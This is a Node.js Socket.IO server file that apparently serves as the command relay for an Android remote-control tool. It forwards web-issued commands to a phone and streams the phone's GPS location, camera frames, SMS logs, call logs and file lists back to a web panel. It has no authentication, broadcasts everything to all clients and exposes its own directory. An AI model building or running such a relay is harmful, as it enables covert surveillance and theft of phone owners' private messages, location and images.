const express = require('express');
const path = require('path'); // Required to resolve directories
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");

const io = new Server(server, {
  maxHttpBufferSize: 1e8 
});

const PORT = process.env.PORT || 3000;

// This serves ALL files in your folder (images, scripts, etc.)
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});
io.on('connection', (socket) => {
  console.log('A user connected: ' + socket.id);

  // --- COMMAND FLOW: Web -> Server -> Phone ---
  socket.on('phone-execute', (cmd) => {
    console.log('Command received from Web:', cmd);
    // Broadcast the command to the Android device
    io.emit('phone-execute', cmd);
  });

  // --- DATA FLOW: Phone -> Server -> Web ---

  // 1. Handle Battery Updates
  socket.on('battery-update', (data) => {
    console.log('Battery Level:', data);
    io.emit('battery-update', data);
  });

  // 2. Handle GPS/Location Updates
  socket.on('location-update', (data) => {
    console.log('Location received:', data);
    io.emit('location-update', data);
  });

  // 3. Handle Camera Image Streams (Base64)
  socket.on('data-stream', (base64Data) => {
    console.log('Camera frame received');
    io.emit('data-stream', base64Data);
  });

  // 4. Handle SMS Logs
  socket.on('sms-data', (data) => {
    console.log('SMS Data received');
    io.emit('sms-data', data);
  });

  // 5. Handle Call Logs
  socket.on('call-data', (data) => {
    console.log('Call Log data received');
    io.emit('call-data', data);
  });

  // 6. Handle File Manager Data
  socket.on('file-data', (data) => {
    console.log('File list received');
    io.emit('file-data', data);
  });

  socket.on('disconnect', () => {
    console.log('User disconnected');
  });
});

server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});

